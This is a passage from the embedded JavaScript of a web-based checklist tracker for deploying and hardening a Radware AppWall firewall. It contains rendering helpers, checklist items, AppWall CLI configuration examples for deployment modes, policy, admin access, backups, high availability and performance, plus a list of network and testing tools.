                        <div class="flex-1">
                            <div class="flex items-center gap-2 mb-1">
                                <span class="text-gray-900">${item.text}</span>
                                <span class="inline-block h-2 w-2 ${priorityClass} rounded-full" 
                                      title="${capitalizeFirstLetter(item.priority)} priority"></span>
                            </div>
                            <div class="flex items-center justify-between mt-2">
                                <span class="text-xs text-gray-500">${item.groupTitle}</span>
                                <span class="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${statusClass}">
                                    ${statusText}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            `;
        });
        
        categoryHTML += `
                </div>
            </div>
        `;
        
        container.innerHTML += categoryHTML;
    });
    
    // Show results
    container.classList.remove('hidden');
    noResults.classList.add('hidden');
    statsContainer.classList.remove('hidden');
}

function navigateToTaskItem(categoryId, taskId) {
    // First, open the category if it's not already open
    if (currentCategory !== categoryId) {
        openCategory(categoryId);
    }
    
    // Wait for the category to fully load
    setTimeout(() => {
        // Find the task item
        const taskItem = document.querySelector(`.task-item[data-task-id="${taskId}"]`);
        if (!taskItem) return;
        
        // Scroll to the item
        taskItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
        // Apply highlight animation
        taskItem.classList.add('highlight-item');
        
        // Remove highlight class after animation completes
        setTimeout(() => {
            taskItem.classList.remove('highlight-item');
        }, 2000);
    }, 300);
}

function getStatusDisplayText(status) {
    switch (status) {
        case 'passed':
            return 'Completed';
        case 'na':
            return 'Not Applicable';
        case 'not-tested':
        default:
            return 'Not Started';
    }
}

function getStatusDisplayClass(status) {
    switch (status) {
        case 'passed':
            return 'bg-green-100 text-green-800';
        case 'na':
            return 'bg-gray-100 text-gray-800';
        case 'not-tested':
        default:
            return 'bg-yellow-100 text-yellow-800';
    }
}

function getPriorityIndicatorClass(priority) {
    switch (priority) {
        case 'critical':
            return 'bg-status-critical';
        case 'high':
            return 'bg-status-high';
        case 'medium':
            return 'bg-status-medium';
        case 'low':
            return 'bg-status-low';
        default:
            return 'bg-gray-400';
    }
}











</script>







    <script>
      // --- Constants and Configuration ---
const STORAGE_KEY = 'radware-appwall-projects-v1';
const TASK_STATUS = {
    NOT_TESTED: 'not-tested',
    PASSED: 'passed',
    NA: 'na'
};

// --- Global State Management ---
let currentCategory = '';
let currentProject = null;
let projects = {};
let confirmCallback = null;
let currentEditingFindingId = null;
let filterActive = false;
let searchQuery = '';

// --- Comprehensive Radware AppWall WAF Data Structure ---
const appwallData = {
    categories: [
    {
    id: 'deployment',
    title: '1. Initial Deployment & Architecture',
    subtitle: 'Base configuration setup, deployment modes, and network architecture',
    icon: 'fa-server',
    priority: 'critical',
    progress: 12,
    checklist: [
        {
            title: '1.1 Deployment Mode Configuration',
            icon: 'fa-network-wired',
            items: [
                { id: '1.1.1', text: 'Select appropriate deployment mode (Transparent Bridge, Reverse Proxy, or Out-of-Path)', priority: 'critical' },
                { id: '1.1.2', text: 'Configure network interfaces with appropriate IP and VLAN settings', priority: 'critical' },
                { id: '1.1.3', text: 'Set default gateway and DNS server configurations', priority: 'high' },
                { id: '1.1.4', text: 'Configure SSL/TLS for encrypted AppWall management', priority: 'critical' },
                { id: '1.1.5', text: 'Implement access control lists for AppWall management interfaces', priority: 'critical' },
                { id: '1.1.6', text: 'Verify connectivity with upstream and downstream network components', priority: 'high' },
                { id: '1.1.7', text: 'Configure management network access restrictions', priority: 'critical' },
                { id: '1.1.8', text: 'Set up traffic bypass rules for maintenance access', priority: 'medium' },
                { id: '1.1.9', text: 'Implement link aggregation for interface redundancy where needed', priority: 'high' },
                { id: '1.1.10', text: 'Configure jumbo frames if required by network architecture', priority: 'medium' },
                { id: '1.1.11', text: 'Set up VRRP for high availability pairs', priority: 'critical' },
                { id: '1.1.12', text: 'Implement QoS prioritization for critical application traffic', priority: 'medium' },
                { id: '1.1.13', text: 'Configure traffic mirroring for forensic analysis', priority: 'medium' },
                { id: '1.1.14', text: 'Set up route health injection for dynamic failover', priority: 'high' }
            ]
        },
        {
            title: '1.2 Initial Security Policy',
            icon: 'fa-shield-alt',
            items: [
                { id: '1.2.1', text: 'Create base security policy with descriptive name', priority: 'high' },
                { id: '1.2.2', text: 'Configure initial policy in passive/learning mode', priority: 'critical' },
                { id: '1.2.3', text: 'Set default security policy actions (alert, block, learning)', priority: 'critical' },
                { id: '1.2.4', text: 'Configure initial whitelists for trusted sources', priority: 'high' },
                { id: '1.2.5', text: 'Define custom block pages with appropriate branding', priority: 'medium' },
                { id: '1.2.6', text: 'Set up default signature policy protections', priority: 'critical' },
                { id: '1.2.7', text: 'Configure base HTTP protocol compliance checks', priority: 'high' },
                { id: '1.2.8', text: 'Enable passive learning phase for trusted traffic', priority: 'critical' },
                { id: '1.2.9', text: 'Configure application profile mapping for different web applications', priority: 'high' },
                { id: '1.2.10', text: 'Implement rate limiting for API endpoints', priority: 'high' },
                { id: '1.2.11', text: 'Set up bot mitigation and CAPTCHA challenges', priority: 'medium' },
                { id: '1.2.12', text: 'Configure geolocation-based access rules', priority: 'medium' },
                { id: '1.2.13', text: 'Implement session tracking and enforcement', priority: 'high' },
                { id: '1.2.14', text: 'Set up custom error handling for security events', priority: 'medium' }
            ]
        },
        {
            title: '1.3 System Configuration',
            icon: 'fa-cogs',
            items: [
                { id: '1.3.1', text: 'Secure default AppWall administrative accounts', priority: 'critical' },
                { id: '1.3.2', text: 'Create RBAC user accounts with appropriate permissions', priority: 'high' },
                { id: '1.3.3', text: 'Configure NTP for accurate time synchronization', priority: 'medium' },
                { id: '1.3.4', text: 'Set up remote syslog server for log collection', priority: 'high' },
                { id: '1.3.5', text: 'Configure email alerts for critical events', priority: 'high' },
                { id: '1.3.6', text: 'Enable and schedule automated backups of configuration', priority: 'critical' },
                { id: '1.3.7', text: 'Set up SNMP monitoring for infrastructure integration', priority: 'medium' },
                { id: '1.3.8', text: 'Configure resource utilization alerts and thresholds', priority: 'high' },
                { id: '1.3.9', text: 'Implement certificate management for SSL/TLS', priority: 'critical' },
                { id: '1.3.10', text: 'Set up emergency access credentials in secure storage', priority: 'high' },
                { id: '1.3.11', text: 'Configure audit logging for administrative actions', priority: 'critical' },
                { id: '1.3.12', text: 'Implement multi-factor authentication for admin access', priority: 'critical' },
                { id: '1.3.13', text: 'Set up automated OS and signature updates', priority: 'high' },
                { id: '1.3.14', text: 'Configure disk usage monitoring and cleanup policies', priority: 'medium' }
            ]
        },
        {
            title: '1.4 High Availability Configuration',
            icon: 'fa-sync-alt',
            items: [
                { id: '1.4.1', text: 'Deploy redundant AppWall instances in active-passive mode', priority: 'critical' },
                { id: '1.4.2', text: 'Configure heartbeat interfaces between HA pairs', priority: 'critical' },
                { id: '1.4.3', text: 'Set up automatic configuration synchronization', priority: 'high' },
                { id: '1.4.4', text: 'Implement stateful session failover mechanisms', priority: 'high' },
                { id: '1.4.5', text: 'Configure floating virtual IP addresses for HA pairs', priority: 'critical' },
                { id: '1.4.6', text: 'Set up monitoring for HA status and alerts', priority: 'high' },
                { id: '1.4.7', text: 'Test manual and automatic failover procedures', priority: 'critical' },
                { id: '1.4.8', text: 'Document HA architecture and recovery procedures', priority: 'medium' },
                { id: '1.4.9', text: 'Configure split-brain detection and prevention', priority: 'high' },
                { id: '1.4.10', text: 'Implement different network paths for heartbeat communication', priority: 'medium' }
            ]
        },
        {
            title: '1.5 Performance Optimization',
            icon: 'fa-tachometer-alt',
            items: [
                { id: '1.5.1', text: 'Tune TCP/IP stack parameters for optimal throughput', priority: 'high' },
                { id: '1.5.2', text: 'Configure connection pooling for backend servers', priority: 'high' },
                { id: '1.5.3', text: 'Implement caching strategies for static content', priority: 'medium' },
                { id: '1.5.4', text: 'Optimize SSL/TLS cipher selection for performance', priority: 'high' },
                { id: '1.5.5', text: 'Configure hardware acceleration for cryptographic operations', priority: 'medium' },
                { id: '1.5.6', text: 'Set up content compression for appropriate traffic types', priority: 'medium' },
                { id: '1.5.7', text: 'Implement request rate limiting for DoS protection', priority: 'critical' },
                { id: '1.5.8', text: 'Configure traffic prioritization based on application criticality', priority: 'high' },
                { id: '1.5.9', text: 'Tune inspection engine for optimal CPU utilization', priority: 'high' },
                { id: '1.5.10', text: 'Set up performance baselines and monitoring', priority: 'high' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Deployment Mode Selection Guidelines',
            content: `
                <p class="mb-4 text-gray-700">Selecting the appropriate deployment mode is critical for AppWall's effectiveness and minimal impact on network architecture.</p>
                
                <h5 class="font-semibold mb-2 text-gray-800">Transparent Bridge Mode</h5>
                <p class="mb-4 text-gray-700">Best for initial deployments and when minimal network changes are required. AppWall acts as a layer 2 bridge between network segments.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure Transparent Bridge Mode</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> operation-mode</div>
                    <div><span class="code-highlight">operation-mode transparent-bridge</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">interface</span> eth1</div>
                    <div><span class="code-param">description</span> <span class="code-value">"External Interface"</span></div>
                    <div><span class="code-param">mtu</span> <span class="code-value">1500</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">interface</span> eth2</div>
                    <div><span class="code-param">description</span> <span class="code-value">"Internal Interface"</span></div>
                    <div><span class="code-param">mtu</span> <span class="code-value">1500</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">bridge</span> br0</div>
                    <div><span class="code-param">ports</span> <span class="code-value">eth1 eth2</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Reverse Proxy Mode</h5>
                <p class="mb-4 text-gray-700">Recommended for highest security and when SSL/TLS termination is required. AppWall terminates client connections and creates new connections to backend servers.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure Reverse Proxy Mode</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> operation-mode</div>
                    <div><span class="code-highlight">operation-mode reverse-proxy</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">interface</span> eth1</div>
                    <div><span class="code-param">description</span> <span class="code-value">"External Interface"</span></div>
                    <div><span class="code-param">ip address</span> <span class="code-value">203.0.113.10/24</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">interface</span> eth2</div>
                    <div><span class="code-param">description</span> <span class="code-value">"Internal Interface"</span></div>
                    <div><span class="code-param">ip address</span> <span class="code-value">10.0.0.10/24</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">route</span> default gateway 203.0.113.1</div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Out-of-Path Mode</h5>
                <p class="mb-4 text-gray-700">Ideal for monitoring-only deployments or when minimal latency impact is required. Traffic is mirrored to AppWall for analysis without affecting the flow.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure Out-of-Path Mode</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> operation-mode</div>
                    <div><span class="code-highlight">operation-mode out-of-path</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">interface</span> eth1</div>
                    <div><span class="code-param">description</span> <span class="code-value">"Management Interface"</span></div>
                    <div><span class="code-param">ip address</span> <span class="code-value">10.0.0.20/24</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">interface</span> eth2</div>
                    <div><span class="code-param">description</span> <span class="code-value">"Monitoring Interface"</span></div>
                    <div><span class="code-param">promiscuous-mode</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">route</span> default gateway 10.0.0.1</div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Initial Security Policy Configuration',
            content: `
                <p class="mb-4 text-gray-700">Begin with a properly configured security policy that allows legitimate traffic while detecting potential attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Create and configure initial security policy</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Web-Portal"</span> <span class="code-param">description</span> <span class="code-value">"Main web portal protection"</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div class="code-comment"># Set policy to passive learning mode initially</div>
                    <div><span class="code-highlight">enforce-mode passive</span></div>
                    <div><span class="code-highlight">learning state enable</span></div>
                    <div><span class="code-param">learning duration</span> <span class="code-value">14</span></div>
                    <div class="code-comment"># Enable baseline security features</div>
                    <div><span class="code-param">http compliance</span> <span class="code-value">strict</span></div>
                    <div><span class="code-param">attack-signatures state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">attack-signatures sensitivity</span> <span class="code-value">medium</span></div>
                    <div class="code-comment"># Configure whitelist for testing systems</div>
                    <div><span class="code-command">whitelist</span> <span class="code-value">add</span> <span class="code-param">ip</span> <span class="code-value">192.168.10.0/24</span> <span class="code-param">description</span> <span class="code-value">"QA Testing subnet"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Custom Block Page Configuration</h5>
                <p class="mb-4 text-gray-700">Configure professional block pages that comply with your organization's branding and provide appropriate user guidance.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure custom block pages</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">block-page</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Corporate-Block-Page"</span></div>
                    <div><span class="code-command">block-page</span> <span class="code-value">"Corporate-Block-Page"</span></div>
                    <div><span class="code-param">type</span> <span class="code-value">custom</span></div>
                    <div><span class="code-param">template</span> <span class="code-value">default</span></div>
                    <div><span class="code-param">title</span> <span class="code-value">"Security Alert - Access Blocked"</span></div>
                    <div><span class="code-param">company-name</span> <span class="code-value">"Example Corporation"</span></div>
                    <div><span class="code-param">company-logo</span> <span class="code-value">upload</span> <span class="code-param">file</span> <span class="code-value">"/tmp/logo.png"</span></div>
                    <div><span class="code-param">contact-info</span> <span class="code-value">"Please contact security@example.com for assistance"</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-param">block-page</span> <span class="code-value">"Corporate-Block-Page"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Administrative Security Hardening',
            content: `
                <p class="mb-4 text-gray-700">Properly securing administrative access to the WAF is critical to preventing compromise of the security system itself.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure secure admin access</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> administration</div>
                    <div class="code-comment"># Change default admin password</div>
                    <div><span class="code-highlight">user admin password</span></div>
                    <div class="code-comment"># Create role-based user accounts</div>
                    <div><span class="code-command">user</span> <span class="code-value">add</span> <span class="code-param">username</span> <span class="code-value">"security-admin"</span> <span class="code-param">role</span> <span class="code-value">"administrator"</span></div>
                    <div><span class="code-command">user</span> <span class="code-value">add</span> <span class="code-param">username</span> <span class="code-value">"policy-editor"</span> <span class="code-param">role</span> <span class="code-value">"security-editor"</span></div>
                    <div><span class="code-command">user</span> <span class="code-value">add</span> <span class="code-param">username</span> <span class="code-value">"monitor-only"</span> <span class="code-param">role</span> <span class="code-value">"security-viewer"</span></div>
                    <div class="code-comment"># Configure management access security</div>
                    <div><span class="code-command">ssh</span> <span class="code-param">allowed-networks</span> <span class="code-value">10.0.0.0/24</span></div>
                    <div><span class="code-command">gui</span> <span class="code-param">allowed-networks</span> <span class="code-value">10.0.0.0/24</span></div>
                    <div><span class="code-command">ssh</span> <span class="code-param">idle-timeout</span> <span class="code-value">600</span></div>
                    <div><span class="code-command">gui</span> <span class="code-param">idle-timeout</span> <span class="code-value">900</span></div>
                    <div><span class="code-command">gui</span> <span class="code-param">ssl-protocols</span> <span class="code-value">TLSv1.2 TLSv1.3</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Setting Up Backup and Recovery</h5>
                <p class="mb-4 text-gray-700">Regular backups enable quick recovery from configuration issues or hardware failures.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure automated backups</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> maintenance</div>
                    <div><span class="code-command">backup</span> <span class="code-param">schedule</span> <span class="code-value">weekly</span> <span class="code-param">day</span> <span class="code-value">sunday</span> <span class="code-param">time</span> <span class="code-value">02:00</span></div>
                    <div><span class="code-command">backup</span> <span class="code-param">location</span> <span class="code-value">scp</span> <span class="code-param">server</span> <span class="code-value">10.0.0.50</span> <span class="code-param">path</span> <span class="code-value">"/backups/appwall"</span></div>
                    <div><span class="code-command">backup</span> <span class="code-param">credentials</span> <span class="code-param">username</span> <span class="code-value">"backup-user"</span> <span class="code-param">password</span></div>
                    <div><span class="code-command">backup</span> <span class="code-param">retain</span> <span class="code-value">10</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                    <div class="code-comment"># Create an immediate backup</div>
                    <div><span class="code-command">system</span> backup create <span class="code-param">description</span> <span class="code-value">"Initial configuration backup"</span></div>
                </div>
            `
        },
        {
            title: 'High Availability Configuration',
            content: `
                <p class="mb-4 text-gray-700">Implementing high availability ensures continuous protection even during hardware failures or maintenance.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure HA pair setup</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> high-availability</div>
                    <div><span class="code-param">mode</span> <span class="code-value">active-passive</span></div>
                    <div><span class="code-param">group-id</span> <span class="code-value">1</span></div>
                    <div><span class="code-param">priority</span> <span class="code-value">100</span></div>
                    <div><span class="code-command">vrrp</span> <span class="code-param">virtual-router-id</span> <span class="code-value">10</span></div>
                    <div><span class="code-command">interface</span> <span class="code-param">heartbeat</span> <span class="code-value">eth3</span></div>
                    <div><span class="code-command">interface</span> <span class="code-param">data-sync</span> <span class="code-value">eth3</span></div>
                    <div><span class="code-param">peer-address</span> <span class="code-value">10.0.0.11</span></div>
                    <div><span class="code-param">sync-config</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sync-policy</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">preempt</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">preempt-delay</span> <span class="code-value">300</span></div>
                    <div><span class="code-command">virtual-address</span> <span class="code-value">add</span> <span class="code-param">interface</span> <span class="code-value">eth1</span> <span class="code-param">address</span> <span class="code-value">203.0.113.100/24</span></div>
                    <div><span class="code-command">virtual-address</span> <span class="code-value">add</span> <span class="code-param">interface</span> <span class="code-value">eth2</span> <span class="code-param">address</span> <span class="code-value">10.0.0.100/24</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">HA Verification and Testing</h5>
                <p class="mb-4 text-gray-700">Verify high availability operation with thorough testing before relying on it in production.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Verify HA status</div>
                    <div><span class="code-command">show</span> high-availability status</div>
                    <div class="code-comment"># Test manual failover</div>
                    <div><span class="code-command">high-availability</span> manual-failover</div>
                    <div class="code-comment"># Verify synchronization status</div>
                    <div><span class="code-command">show</span> high-availability sync-status</div>
                </div>
            `
        },
        {
            title: 'Performance Tuning',
            content: `
                <p class="mb-4 text-gray-700">Optimizing WAF performance ensures security without compromising application responsiveness.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure performance optimizations</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">system</span> performance</div>
                    <div class="code-comment"># TCP optimization</div>
                    <div><span class="code-param">tcp-max-connections</span> <span class="code-value">1000000</span></div>
                    <div><span class="code-param">tcp-idle-timeout</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">tcp-keepalive-timeout</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">tcp-fin-timeout</span> <span class="code-value">30</span></div>
                    <div class="code-comment"># HTTP connection pooling</div>
                    <div><span class="code-command">http</span> <span class="code-param">server-pool</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">http</span> <span class="code-param">server-pool-size</span> <span class="code-value">1000</span></div>
                    <div><span class="code-command">http</span> <span class="code-param">server-pool-timeout</span> <span class="code-value">60</span></div>
                    <div class="code-comment"># SSL optimization</div>
                    <div><span class="code-command">ssl</span> <span class="code-param">hardware-acceleration</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">ssl</span> <span class="code-param">session-cache</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">ssl</span> <span class="code-param">session-cache-timeout</span> <span class="code-value">3600</span></div>
                    <div><span class="code-command">ssl</span> <span class="code-param">session-cache-size</span> <span class="code-value">100000</span></div>
                    <div class="code-comment"># Content compression</div>
                    <div><span class="code-command">compression</span> <span class="code-param">enable</span></div>
                    <div><span class="code-command">compression</span> <span class="code-param">min-size</span> <span class="code-value">1024</span></div>
                    <div><span class="code-command">compression</span> <span class="code-param">content-type</span> <span class="code-value">add</span> <span class="code-param">type</span> <span class="code-value">"text/html"</span></div>
                    <div><span class="code-command">compression</span> <span class="code-param">content-type</span> <span class="code-value">add</span> <span class="code-param">type</span> <span class="code-value">"text/css"</span></div>
                    <div><span class="code-command">compression</span> <span class="code-param">content-type</span> <span class="code-value">add</span> <span class="code-param">type</span> <span class="code-value">"application/javascript"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        }
    ],
    tools: [
        {
            title: 'AppWall CLI',
            icon: 'fa-terminal',
            description: 'The command-line interface for Radware AppWall provides full control over deployment and configuration settings.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Documentation'
        },
        {
            title: 'Wireshark',
            icon: 'fa-network-wired',
            description: 'Network protocol analyzer for verifying traffic flow through AppWall and confirming proper WAF operation modes.',
            link: 'https://www.wireshark.org/',
            linkText: 'Website'
        },
        {
            title: 'DefenseFlow',
            icon: 'fa-shield-alt',
            description: 'Radware\'s security orchestration tool that integrates with AppWall for centralized management of multiple WAF instances.',
            link: 'https://www.radware.com/products/defenseflow/',
            linkText: 'Website'
        },
        {
            title: 'Traceroute / MTR',
            icon: 'fa-route',
            description: 'Network diagnostic tools to verify routing through the AppWall and confirm proper network path configuration.',
            link: 'https://github.com/traviscross/mtr',
            linkText: 'MTR GitHub'
        },
        {
            title: 'Apache Benchmark (ab)',
            icon: 'fa-tachometer-alt',
            description: 'Load testing tool for validating AppWall performance in different deployment modes and traffic conditions.',
            link: 'https://httpd.apache.org/docs/2.4/programs/ab.html',
            linkText: 'Documentation'
        },
        {
            title: 'AppWall Sync Tool',
            icon: 'fa-sync-alt',
            description: 'Radware\'s tool for policy synchronization between testing and production environments to ensure consistent configuration.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Information'
        },
        {
            title: 'OWASP ZAP',
            icon: 'fa-bug',
            description: 'Open-source security testing tool for finding vulnerabilities in web applications and validating WAF configurations.',
            link: 'https://www.zaproxy.org/',
            linkText: 'Website'
        },
        {
            title: 'Keepalived',
            icon: 'fa-heartbeat',
            description: 'Open-source tool for implementing VRRP and managing high-availability deployments.',
            link: 'https://www.keepalived.org/',
            linkText: 'Website'
        },
        {
            title: 'Grafana',
            icon: 'fa-chart-line',
            description: 'Visualization platform for monitoring AppWall metrics and performance with customizable dashboards.',
            link: 'https://grafana.com/',
            linkText: 'Website'
        },
        {
            title: 'tcpdump',
            icon: 'fa-network-wired',
            description: 'Command-line packet analyzer for troubleshooting complex network issues and validating packet flows.',
            link: 'https://www.tcpdump.org/',
            linkText: 'Website'
        },
        {
            title: 'Elastic Stack',
            icon: 'fa-search',
            description: 'Suite of tools for collecting, processing, storing, and visualizing WAF logs and security events.',
            link: 'https://www.elastic.co/elastic-stack/',
            linkText: 'Website'
        },
        {
            title: 'JMeter',
            icon: 'fa-tachometer-alt',
            description: 'Advanced load testing tool for simulating complex application traffic patterns through the WAF.',
            link: 'https://jmeter.apache.org/',
            linkText: 'Website'
        }
    ]
},
        {
    id: 'mapping',
    title: '2. Web Application Mapping',
    subtitle: 'Application profiling, service definitions, and traffic learning',
    icon: 'fa-sitemap',
    priority: 'high',
    progress: 26,
    checklist: [
        {
            title: '2.1 Web Application Definition',
            icon: 'fa-globe',
            items: [
                { id: '2.1.1', text: 'Define web application services and their base URLs', priority: 'critical' },
                { id: '2.1.2', text: 'Map application public entry points and domains', priority: 'high' },
                { id: '2.1.3', text: 'Identify and document application architecture', priority: 'medium' },
                { id: '2.1.4', text: 'Configure backend server pool definitions', priority: 'critical' },
                { id: '2.1.5', text: 'Set up health checks for backend services', priority: 'high' },
                { id: '2.1.6', text: 'Create logical application groupings', priority: 'medium' },
                { id: '2.1.7', text: 'Define application dependencies and interconnections', priority: 'medium' },
                { id: '2.1.8', text: 'Document load balancing requirements for distributed applications', priority: 'high' },
                { id: '2.1.9', text: 'Map microservice API dependencies and interfaces', priority: 'high' },
                { id: '2.1.10', text: 'Configure virtual hosting for multi-tenant applications', priority: 'high' },
                { id: '2.1.11', text: 'Define SSL/TLS offloading requirements and certificates', priority: 'critical' },
                { id: '2.1.12', text: 'Implement backend connection persistence when needed', priority: 'medium' },
                { id: '2.1.13', text: 'Configure alternative service paths for maintenance', priority: 'medium' },
                { id: '2.1.14', text: 'Define failover strategies for service interruptions', priority: 'high' }
            ]
        },
        {
            title: '2.2 Traffic Learning',
            icon: 'fa-traffic-light',
            items: [
                { id: '2.2.1', text: 'Enable and configure traffic learning', priority: 'critical' },
                { id: '2.2.2', text: 'Set appropriate learning thresholds', priority: 'high' },
                { id: '2.2.3', text: 'Monitor learning process for accurate profiling', priority: 'high' },
                { id: '2.2.4', text: 'Analyze and approve legitimate traffic patterns', priority: 'critical' },
                { id: '2.2.5', text: 'Define learning timeframes for different traffic segments', priority: 'medium' },
                { id: '2.2.6', text: 'Implement continuous learning for evolving applications', priority: 'high' },
                { id: '2.2.7', text: 'Configure trusted source IP ranges for learning', priority: 'critical' },
                { id: '2.2.8', text: 'Set up scheduled policy refinement based on learning results', priority: 'high' },
                { id: '2.2.9', text: 'Define confidence thresholds for automatic rule acceptance', priority: 'high' },
                { id: '2.2.10', text: 'Establish protocol for reviewing and approving learned exceptions', priority: 'critical' },
                { id: '2.2.11', text: 'Configure anomaly detection during learning phase', priority: 'medium' },
                { id: '2.2.12', text: 'Implement separation of test and production traffic for learning', priority: 'high' },
                { id: '2.2.13', text: 'Configure learning for specific traffic patterns (e.g., mobile apps)', priority: 'medium' },
                { id: '2.2.14', text: 'Set up automated notifications for significant learning events', priority: 'medium' }
            ]
        },
        {
            title: '2.3 Content Profiling',
            icon: 'fa-file-alt',
            items: [
                { id: '2.3.1', text: 'Map URLs and expected file types', priority: 'high' },
                { id: '2.3.2', text: 'Configure allowed parameter formats and lengths', priority: 'critical' },
                { id: '2.3.3', text: 'Define content-type restrictions for various URLs', priority: 'high' },
                { id: '2.3.4', text: 'Create file extension and MIME type validations', priority: 'high' },
                { id: '2.3.5', text: 'Build data type definitions for form fields', priority: 'high' },
                { id: '2.3.6', text: 'Define accepted character sets for parameters', priority: 'medium' },
                { id: '2.3.7', text: 'Map file upload paths and restrictions', priority: 'critical' },
                { id: '2.3.8', text: 'Configure content inspection for specific file formats', priority: 'high' },
                { id: '2.3.9', text: 'Set up encoding validation and normalization', priority: 'high' },
                { id: '2.3.10', text: 'Implement JSON/XML payload validation rules', priority: 'critical' },
                { id: '2.3.11', text: 'Configure API schema validations (e.g., Swagger/OpenAPI)', priority: 'high' },
                { id: '2.3.12', text: 'Map required vs. optional parameters for each endpoint', priority: 'high' },
                { id: '2.3.13', text: 'Define maximum request sizes for different application sections', priority: 'medium' },
                { id: '2.3.14', text: 'Implement parameter pollution protections', priority: 'high' }
            ]
        },
        {
            title: '2.4 Authentication and Session Management',
            icon: 'fa-user-lock',
            items: [
                { id: '2.4.1', text: 'Map authentication endpoints and flows', priority: 'critical' },
                { id: '2.4.2', text: 'Configure session token identification and validation', priority: 'critical' },
                { id: '2.4.3', text: 'Define logout processes and token invalidation', priority: 'high' },
                { id: '2.4.4', text: 'Implement session timeout enforcement', priority: 'high' },
                { id: '2.4.5', text: 'Map authorization levels and permission boundaries', priority: 'critical' },
                { id: '2.4.6', text: 'Configure CSRF token validation', priority: 'high' },
                { id: '2.4.7', text: 'Set up OAuth/OIDC integration points', priority: 'high' },
                { id: '2.4.8', text: 'Map multi-factor authentication flows', priority: 'high' },
                { id: '2.4.9', text: 'Define session fixation protections', priority: 'medium' },
                { id: '2.4.10', text: 'Configure brute force prevention for login endpoints', priority: 'critical' }
            ]
        },
        {
            title: '2.5 API Mapping',
            icon: 'fa-plug',
            items: [
                { id: '2.5.1', text: 'Document and define all API endpoints', priority: 'critical' },
                { id: '2.5.2', text: 'Configure API version detection and routing', priority: 'high' },
                { id: '2.5.3', text: 'Map expected HTTP methods for each endpoint', priority: 'critical' },
                { id: '2.5.4', text: 'Define rate limiting and throttling policies', priority: 'high' },
                { id: '2.5.5', text: 'Configure API key validation mechanisms', priority: 'critical' },
                { id: '2.5.6', text: 'Set up JWT validation parameters', priority: 'high' },
